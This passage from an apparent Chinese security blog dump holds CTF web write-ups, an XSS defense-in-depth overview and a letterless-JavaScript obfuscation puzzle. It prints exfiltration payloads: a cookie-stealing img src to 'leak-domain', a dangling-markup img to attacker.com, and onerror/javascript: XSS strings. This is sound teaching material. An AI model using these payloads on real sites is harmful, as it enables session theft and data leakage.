之後修改資料寫入： router.post('/updateUser', async (req, res) => &#123; token = req.cookies[\"token\"] if (token) &#123; user = await db.getUserBy(\"token\", token) if (user) &#123; enteredPremiumPin = req.body[\"premiumPin\"] if (enteredPremiumPin == premiumPin) &#123; user.isPremium = 1 &#125; // ... await db.updateUserByToken(token, user) return res.status(200).json('yes ok'); &#125; &#125; return res.status(401).json('no'); &#125;); admin bot 每次都會執行 updateUser，把 admin user 的 isPremium 設定成 1。 由於 user 是 global variable，db 的操作又是 async 的，所以如果速度夠快的話，updateUser 裡的 user 會是另一個 user，就可以把自己的 user 設定成 premium account。 intended 的話是用 Scroll to Text Fragment (STTF) 來解。 N1CTF - ytiruces參考資料： https://dem0dem0.top/2023/10/20/n1ctf2023/ https://nese.team/posts/n1ctf2023/ 用 WebVTT，一個顯示字幕的格式搭配 CSS selector video::cue(v[voice^=&quot;n1&quot;]) 來 xsleak。 https://developer.mozilla.org/en-US/docs/Web/CSS/::cue 真是有趣的 selector。 Werkzeug cookie parsing quirks來源：Another HTML Renderer 這題又是來自於 @kevin_mizu，前面已經有介紹過兩題他出的題目了，而這題又是一個有趣的題目！ 這題有一個 admin bot 會設定 cookie，裡面有 flag，所以目標就是偷到這個 cookie，而核心程式碼如下： @app.route(\"/render\") def index(): settings = \"\" try: settings = loads(request.cookies.get(\"settings\")) except: pass if settings: res = make_response(render_template(\"index.html\", backgroundColor=settings[\"backgroundColor\"] if \"backgroundColor\" in settings else \"#ffde8c\", textColor=settings[\"textColor\"] if \"textColor\" in settings else \"#000000\", html=settings[\"html\"] if \"html\" in settings else \"\" )) else: res = make_response(render_template(\"index.html\", backgroundColor=\"#ffde8c\", textColor=\"#000000\")) res.set_cookie(\"settings\", \"&#123;&#125;\") return res Python 這邊主要會根據 cookie 內的參數來 render 頁面，template 如下： &lt;iframe id=\"render\" sandbox=\"\" srcdoc=\"&lt;style>* &#123; text-align: center; &#125;&lt;/style>&#123;&#123;html&#125;&#125;\" width=\"70%\" height=\"500px\"> &lt;/iframe> 就算控制了 html，也只能在 sandbox iframe 裡面，不能執行程式碼，也不是 same origin。但以往如果要偷 cookie 的話，基本上都需要先有 same-origin 的 XSS 才行。 而前端的部分可以設定 cookie，但會過濾掉 html 這個字，所以不讓你設定 html： const saveSettings = (settings) => &#123; document.cookie = `settings=$&#123;settings&#125;`; &#125; const getSettings = (d) => &#123; try &#123; s = JSON.parse(d); delete s.html; return JSON.stringify(s); &#125; catch &#123; while (d != d.replaceAll(\"html\", \"\")) &#123; d = d.replaceAll(\"html\", \"\"); &#125; return d; &#125; &#125; window.onload = () => &#123; const params = (new URLSearchParams(window.location.search)); if (params.get(\"settings\")) &#123; window.settings = getSettings(params.get(\"settings\")); saveSettings(window.settings); renderSettings(window.settings); &#125; else &#123; window.settings = getCookie(\"settings\"); &#125; window.settings = JSON.parse(window.settings); 那這題到底要怎麼解呢？這一切都與 werkzeug 解析 cookie 時的邏輯有關。 先來講如何繞過那個 html 的檢查，在 werkzeug 裡面如果你的 cookie value 是用 &quot;&quot; 包住的話，會先進行 decode，因此 &quot;\\150tml&quot; 會被 decode 成 &quot;html&quot;，就可以繞過對於 html 關鍵字的檢查。 但繞過之後，要怎麼拿到 flag 呢？這就要用到 werkzeug 第二個解析 cookie 的特殊之處了。當 werkzeug 在解析 cookie 時，如果碰到 &quot; 時，就會解析到下一個 &quot; 為止。 舉例來說，假設 cookie 的內容是這樣： Cookie: cookie1&#x3D;&quot;abc; cookie2&#x3D;def&quot;; 最後得到的結果會是：&quot;cookie1&quot;: &quot;abc; cookie2=def&quot; 也就是說，如果我們在 flag 的前後各夾一個 cookie，就可以讓 flag 包含在 html 裡面，讓 flag 的內容出現在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload： Cookie: settings&#x3D;&quot;&#123;\\&quot;\\150tml\\&quot;: &quot;&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;leak-domain&#x2F;?cookie&#x3D; ;flag&#x3D;GH&#123;FAKE_FLAG&#125;; settings&#x3D;&#39;&gt;\\&quot;&#125;&quot; 看完這題才突然想到以前 DiceCTF 2023 也出現過類似的題目，那時候是 jetty 有這個行為：Web - jnotes (6 solves)，看來搞不好還不少 web framework 有這個 parsing 行為。","link":"/2023/12/03/xss-and-web-challenges/"},{"title":"淺談 XSS 攻擊與防禦的各個環節","text":"前言談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。 而我所謂的這些「環節」，也可以理解成不同的「關卡」。 舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。 而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」 這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。 假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 &lt;img src=x onerror=alert(1)&gt; 就會變得無效。 若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。 這時候還可以防守什麼呢？那就是試圖把損害控制到最低。 以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。 而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。 接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。 第一關：阻止攻擊者在網站植入程式碼要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句： 永遠不要相信使用者的輸入 只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。 舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。 如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：&lt;script&gt;alert(1)&lt;/script&gt;，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。 這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。 要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 &lt; 轉成 &amp;lt，這樣在畫面上看到的依然是 &lt;，但是對 parser 來說那並不是標籤開始的符號，而是文字的 &lt;，就不會被當作 HTML 標籤來解析。 如此一來，就能防止攻擊者植入程式碼。 不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣： Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1) Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2) 假設你只有想到說要對標籤做跳脫，把 &lt;&gt; 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？ &lt;img src=\"&lt;?= avatar_url ?>\" alt=\"&lt;?= nickname ?>\" />&lt;div>&lt;?= nickname ?>&lt;/div> 除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 &lt;&gt; 是不夠的，因為如果我讓 nickname 變成 &quot; onload=&quot;alert(1) 的話，結合起來就會變成： &lt;img src=\"avatar_url\" alt=\"\" onload=\"alert(1)\" />&lt;div>\" onload=\"alert(1)&lt;/div> 攻擊者可以利用 &quot; 關閉前面的屬性，然後創出一個新的屬性 onload，達成 HTML 標籤屬性利用的 XSS。 所以常見的特殊符號像是 &quot;&#39;&lt;&gt; 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars： 那這樣就打完收工了嗎？還沒。 因為，在連結裡的內容又是另外一回事了，例如說：&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt; 有一種東西叫做 JavaScript pseudo-protocol，可以利用 javascript: 來執行 JS 程式碼，像是這樣：&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;，在使用者點擊這個連結時，就會跳出 alert。 而 javascript:alert(1) 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 &quot;&#39;&lt;&gt;&amp;，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 http:// 或是 http:// 之類的。 這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。 有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」 這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 javascript:alert(1) 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。 React 在 v16.9 的時候就針對這個 case 新增了警告：Deprecating javascript: URLs，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。 這邊有一些相關的討論：React@16.9 block javascript:void(0); #16592 與 False-positive security precaution warning (javascript: URLs) #16382，想看程式碼的話在這邊：react&#x2F;packages&#x2F;react-dom&#x2F;src&#x2F;shared&#x2F;sanitizeURL.js 。 除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。 因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。 舉例來說，搜尋頁面的網址可能長這樣：https://example.com/search?q=hello，而在程式中是這樣寫的： const q = 'hello' // 從網址列拿下來的參數 document.querySelector('.search').innerHTML = q 這時如果你把 q 換成 HTML：&lt;script&gt;alert(1)&lt;/script&gt;，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。 最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 DOMPurify 或是 js-xss 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。 雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：防止 XSS 可能比想像中困難。 總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有： 意識到哪邊是使用者可以自己輸入資料的地方 針對不同情境去做 XSS 的防禦 也可以考慮導入現成的 WAF（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。或是也可以關心一下這個比較新的東西：Trusted Types。 第二關：阻止惡意程式碼被執行假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。 這一關的重點是 CSP，Content Security Policy。 CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 &lt;meta&gt; tag 來指定頁面的 CSP 規則。 舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫： Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; self 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯： CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：Content Security Policy Reference。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）： default-src &#39;none&#39; base-uri &#39;self&#39;; block-all-mixed-content; connect-src &#39;self&#39; uploads.github.com www.githubstatus.com collector.githubapp.com api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com&#x2F;v1&#x2F;events wss:&#x2F;&#x2F;alive.github.com *.actions.githubusercontent.com wss:&#x2F;&#x2F;*.actions.githubusercontent.com online.visualstudio.com&#x2F;api&#x2F;v1&#x2F;locations insights.github.com; font-src github.githubassets.com; form-action &#39;self&#39; github.com gist.github.com; frame-ancestors &#39;none&#39;; frame-src render.githubusercontent.com; img-src &#39;self&#39; data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com secured-user-images.githubusercontent.com&#x2F; *.githubusercontent.com; manifest-src &#39;self&#39;; media-src github.com user-images.githubusercontent.com&#x2F;; script-src github.githubassets.com; style-src &#39;unsafe-inline&#39; github.githubassets.com; worker-src github.com&#x2F;socket-worker-3f088aa2.js gist.github.com&#x2F;socket-worker-3f088aa2.js 想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 CSP Evaluator，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。 這邊可以看到 script-src 的值只有 github.githubassets.com。因為沒有 unsafe-inline 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 github.githubassets.com 這個來源引入，幾乎封死了執行 script 的路。 而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 A Wormable XSS on HackMD! 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager 則是用 Google Tag Manager 來繞。 另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：Breaking XSS mitigations via Script gadgets。 那如果真的沒辦法執行 script，還有什麼可以做的呢？ 就算只是插入 HTML，也還是可以做事的。 例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;。 或者是插入 &lt;img src=&quot;https://attacker.com?q=（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成： &lt;img src=\"https://attacker.com?q= &lt;div>user info&lt;/div> &lt;div>sensitive data&lt;/div> &lt;div class=\"test\">&lt;/div> 藉由 src 沒有閉合的 &quot;，就可以拿到下一個 &quot; 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 img-src 的 CSP 規則也是有用處的，可以防止這類型的攻擊。 或也可以結合 DOM Clobbering，看看有沒有什麼地方可以攻擊。 因此，就算不能執行 script，依然有其他攻擊手法可以用。 GitHub 在 2017 年時有寫過一篇 GitHub’s post-CSP journey，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 GitHub CSP，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。 第三關：降低 XSS 攻擊之損害如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。 這邊我覺得有兩個面向可以去思考： 避免攻擊者用受害者的身份登入 避免攻擊者透過 XSS 進行比較重要的操作 先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 HttpOnly，就能確保前端無法直接用 document.cookie 就取得 cookie。 如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。 再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。 以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。 這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。 其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。 總結資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說： 自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？ 儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？ 2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？ 忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？ XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。 在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。 所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。","link":"/2021/06/19/xss-attack-and-defense/"},{"title":"如何不用英文字母與數字寫出 console.log(1)？","text":"前言最近公司的同事修了一門資安相關的課，因為我本來就對資安滿有興趣的，所以就會跟同事討論一下，這也導致了我這兩週一直在研究相關的東西，都是一些以前聽過但沒有認真研究過的，例如說 LFI（Local File Inclusion）、REC（Remote code execution）、SSRF（Server-Side Request Forgery）或是各種 PHP 的神奇 filter，也能複習原本就已經相對熟悉的 SQL Injection 跟 XSS。 而 CTF 的題目裡面常常會出現需要繞過各種限制的狀況，而這就是考驗對於特定協定或者是程式語言的理解程度的時機了，要想想看怎麼在既有的限制之下，找出至少一種方法可以成功繞過那些限制。 原本這一週不知道要寫什麼，想寫上面提的那些東西但還沒想好怎麼整理，之前的 I Don’t know React 後續系列又還沒整理完，就想說那來跟大家做個跟「繞過限制」有關的趣味小挑戰好了，那就是標題所說的： 在 JavaScript 當中，你可以做到不用英文字母與數字，就成功執行 console.log(1) 嗎？ 換句話說，就是程式碼裡面不能出現任何英文字母（a-zA-Z）與數字（0-9），除此之外（各種符號）都可以。執行程式碼之後，會執行 console.log(1)，然後在 console 印出 1。 如果你有想到以前聽過什麼有趣的服務或是 library 可以做到，先不要。在這之前可以自己先想一下，看有沒有辦法寫出來，然後再去查其他人的解決方法。 若是能從零到有全都自己寫出來，就代表你對 JS 這個程式語言以及各種自動轉型的熟悉程度應該是滿高的。 底下我就提供一下我自己針對這一題的一些想法以及解題過程，有雷，還沒解完不要往下捲動。 &#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D; &#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D;&#x3D;&#x3D;防雷&#x3D;&#x3D; 分析解題的幾個關鍵要能成功執行題目所要求的 console.log(1)，必須要完成幾件事情，像是： 找出如何執行程式碼 如何不用字母與數字得出數字 如何不用字母與數字得出字母 只要這三點都解開了，應該就能達成題目所要求的東西。 讓我們先來想想第一點：「要怎麼執行程式碼？」 直接 console.log 是不可能的，因為就算你用字串拼出 console，你也沒辦法像 PHP 那樣拿字串來執行函式。 那 eval 呢？eval 裡面可以放字串，就可以執行任意程式碼了！可是問題是，我們也沒辦法用 eval，因為不能打英文字。 還有什麼方法呢？還可以用 function constructor：new Function(&quot;console.log(1)&quot;) 來執行，但問題是我們也不能用 new 這個關鍵字，所以乍看之下也不行。不過其實不需要 new 也可以，只要 Function(&quot;console.log(1)&quot;) 就可以建立一個能夠執行特定程式碼的函式。 所以接下來的問題就變成：那我們該如何拿到 function constructor？只要能夠拿到就有機會了。 在 JS 裡面可以用 .constructor 拿到某個東西的 constructor，例如說 &quot;&quot;.constructor 就會得到：ƒ String() &#123; [native code] &#125;，而今天如果你有一個 function，就可以拿到 function constructor 了，像是這樣：(()=&gt;&#123;&#125;).constructor，然後因為我們可以預期這一題會是用字串拼出各種東西，所以沒辦法直接 .constructor，應該改成：(()=&gt;&#123;&#125;)[&#39;constructor&#39;]。 那如果不支援 ES6 了？沒辦法支援箭頭函式怎麼辦？有什麼方法可以拿到一個函式嗎？ 有，而且很容易，就是各種內建函式，例如說 [][&#39;fill&#39;][&#39;constructor&#39;]，其實就是 [].fill.constructor，或者是 &quot;&quot;[&#39;slice&#39;][&#39;constructor&#39;]，也可以拿到 function constructor，所以這不是一件難事，就算沒有箭頭函式也可以拿到。 一開始我們期望的程式碼是這樣：Function(&#39;console.log(1)&#39;)()，用上面改寫的話，就會把前面的 Function 替換成 (()=&gt;&#123;&#125;)[&#39;constructor&#39;]，變成：(()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console.log(1)&#39;)() 只要能湊出這一段，問題就解決了。至此，我們已經解決了第一個問題：執行函式。 如何湊出數字接下來因為數字比較簡單，所以我們先來想一下怎麼湊出數字好了。 這邊的關鍵就在於 JS 的 coercion，如果你有看過一些 JS 轉型的文章，或許會記得 &#123;&#125;+[] 可以得出 0 這個數字。 就算不記得好了，利用 ! 這個運算子，我們可以得出 false，例如說 ![] 或是 !&#123;&#125; 都可以得出 false。然後兩個 false 相加就可以得到 0：![]+![]，以此類推，既然 ![] 是 false，那前面再加一個 not，!![] 就是 true，所以![] + !![] 就等於 false + true，也就是 0 + 1，結果就會是 1。 或其實也有更短的方法，用 +[] 也可以利用自動轉型得到 0 這個結果，那 +!![] 就是 1。 有了 1 之後，就可以湊出所有數字了，因為你只要一直暴力不斷相加就好了，有多少就加多少次。或如果你不想這樣做，也可以利用位元運算 &lt;&lt; &gt;&gt; 或者是乘號，比如說要湊出 8，就是 1 &lt;&lt; 3，或者是 2 &lt;&lt; 2，那要湊出 2 就是 (+!![])+(+!![])，所以 (+!![])+(+!![]) &lt;&lt; (+!![])+(+!![]) 就會是 8，只要四個 1 就行了，不需要自己加 8 次。 不過我們可以先不考慮長度，只要考慮能不能湊出來就行了，只要湊出 1 我們就已經獲勝了。 如何湊出字串？最後呢，就是要想辦法湊出字串了，或者換句話說，要能湊出 (()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console.log(1)&#39;)() 裡面的各個字元。 可是我們要怎麼樣才能湊出字元呢？ 關鍵跟數字一樣，就是 coercion！ 上面有講過 ![] 可以拿到 false，那你後面再加一個字串：![] + &#39;&#39;，不就可以拿到 &quot;false&quot; 了嗎？那這樣我們就可以拿到 a, e, f, l, s 這五個字元。舉例來說，(![] + &#39;&#39;)[1] 就是 a，為了方便紀錄，我們來寫一點小程式吧！ const mapping = &#123; a: \"(![] + '')[1]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", l: \"(![] + '')[2]\", s: \"(![] + '')[3]\", &#125; 那既然有了 false，拿到 true 也不是一件難事，!![] + &#39;&#39; 就可以拿到 true，我們的程式碼就可以改成： const mapping = &#123; a: \"(![] + '')[1]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", l: \"(![] + '')[2]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; 再來呢？再來一樣利用轉型，用 &#39;&#39;+&#123;&#125; 可以得到 &quot;[object Object]&quot;（或是你要用神奇的 []+&#123;&#125; 也行），我們的表就可以更新成這樣： const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; 再來，從陣列或是物件拿一個不存在的屬性會回傳什麼？undefined，再把 undefined 加上字串，就可以拿到字串的 undefined，像是這樣：[][&#123;&#125;]+&#39;&#39;，就可以拿到 undefined。 拿到之後，我們的轉換表就變得更加完整了： const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", d: \"([][&#123;&#125;]+'')[2]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", i: \"([][&#123;&#125;]+'')[5]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", n: \"([][&#123;&#125;]+'')[1]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; 看了一下轉換表，再看一下我們的目標字串：(()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;console[&quot;log&quot;](1)&#39;)()，稍微比對一下，發現要湊出 constructor 是沒有問題的，要湊出 console 也是沒問題的，可是就唯獨缺了 log 的 g，我們目前的轉換表裡面沒有這個字元。 所以一定還要再從某個地方把 g 拿出來，才能湊出我們想要的字串。或者也可以換個方法，用別的方式拿到字元。 我當初想到兩個方法，第一個方法是利用進位轉換，把數字用 toString 轉成字串的時候，其實可以帶一個參數 radix，代表這個數字要轉換成多少進制，像是 (10).toString(16) 就會得到 a，因為 10 進制的 10 就是 16 進制的 a。 英文字母一共 26 個，數字有 10 個，所以只要用 (10).toString(36) 就能得到 a，用 (16).toString(36) 就可以得到 g 了，我們可以用這個方法拿到所有的英文字母。可是問題來了，那就是 toString 本身也有 g，但我們現在沒有，所以這方法行不通。 另外一個當初想到的方法是用 base64，JS 有內建兩個函式：btoa 跟 atob，btoa 是把一個字串 encode 成 base64，例如說 btoa(&#39;abc&#39;) 會得到 YWJj，然後再用 atob(&#39;YWJj&#39;) 做 decode 就會得到 abc。 我們只要想辦法讓 base64 encode 後的結果有 g 就沒問題了，這邊可以寫程式去跑也可以自己慢慢試，很幸運地，btoa(2) 就能拿到 Mg== 這個字串。所以 btoa(2)[1] 就會是 g 了。 不過下一個問題來了，我們要怎麼執行 btoa？一樣只能透過上面的 function constructor：(()=&gt;&#123;&#125;)[&#39;constructor&#39;](&#39;return btoa(2)[1]&#39;)()，而這次很幸運地，上面的每一個字元我們都湊得出來！ 我們可以結合上面的 mapping，寫一個簡單的小程式來幫我們做轉換，目標是把一個字串轉成沒有字元的形式： const mapping = &#123; a: \"(![] + '')[1]\", b: \"(''+&#123;&#125;)[2]\", c: \"(''+&#123;&#125;)[5]\", d: \"([][&#123;&#125;]+'')[2]\", e: \"(![] + '')[4]\", f: \"(![] + '')[0]\", i: \"([][&#123;&#125;]+'')[5]\", j: \"(''+&#123;&#125;)[3]\", l: \"(![] + '')[2]\", n: \"([][&#123;&#125;]+'')[1]\", o: \"(''+&#123;&#125;)[1]\", r: \"(!![] + '')[1]\", s: \"(![] + '')[3]\", t: \"(!![] + '')[0]\", u: \"(!![] + '')[2]\", &#125; const one = '(+!![])' const zero = '(+[])' function transformString(input) &#123; return input.split('').map(char => &#123; // 先假設數字只會有個位數，比較好做轉換 if (/[0-9]/.test(char)) &#123; if (char === '0') return zero return Array(+char).fill().map(_ => one).join('+') &#125; if (/[a-zA-Z]/.test(char)) &#123; return mapping[char] &#125; return `\"$&#123;char&#125;\"` &#125;) // 加上 () 保證執行順序 .map(char => `($&#123;char&#125;)`) .join('+') &#125; const input = 'constructor' console.log(transformString(input)) 輸出是： ((''+&#123;&#125;)[5])+((''+&#123;&#125;)[1])+(([][&#123;&#125;]+'')[1])+((![] + '')[3])+((!![] + '')[0])+((!![] + '')[1])+((!![] + '')[2])+((''+&#123;&#125;)[5])+((!![] + '')[0])+((''+&#123;&#125;)[1])+((!![] + '')[1]) 可以再寫一個函式只轉換數字，把數字去掉： function transformNumber(input) &#123; return input.split('').map(char => &#123; // 先假設數字只會有個位數，比較好做轉換 if (/[0-9]/.test(char)) &#123; if (char === '0') return zero let newChar = Array(+char).fill().map(_ => one).join('+') return`($&#123;newChar&#125;)` &#125; return char &#125;) .join('') &#125; const input = 'constructor' console.log(transformNumber(transformString(input))) 得到的結果是： 